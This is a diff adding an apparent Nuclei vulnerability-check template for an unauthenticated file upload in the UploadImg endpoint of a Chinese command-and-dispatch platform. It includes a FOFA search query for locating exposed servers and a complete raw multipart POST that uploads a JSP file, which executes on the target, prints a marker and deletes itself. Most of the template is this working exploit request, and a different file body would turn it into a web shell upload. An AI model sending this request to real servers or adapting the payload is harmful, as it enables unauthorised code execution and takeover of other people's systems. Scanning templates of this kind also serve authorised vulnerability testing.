@@ -1,0 +1,36 @@
+id: visual-command-platform-uploadimg-file-upload
+
+info:
+  name: "可视化融合指挥调度平台 UploadImg 接口未授权文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="base/searchInfoWindow_min.cs
+        可视化融合指挥调度平台的 UploadImg 接口未实施有效身份验证机制，攻击者可绕过认证流程通过该接口实现任意文件上传。此漏洞允许远程攻击者部署恶意代码至服务器，从而获取系统控制权限。
+  tags: 可视化融合指挥调度平台
+
+http:
+- raw:
+  - |
+    POST /dispatch/layuiIm/uploadImg HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp
+    Content-Disposition: form-data; name="file";filename="NTest.jsp"
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary7ctER307B0RaQwOp--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
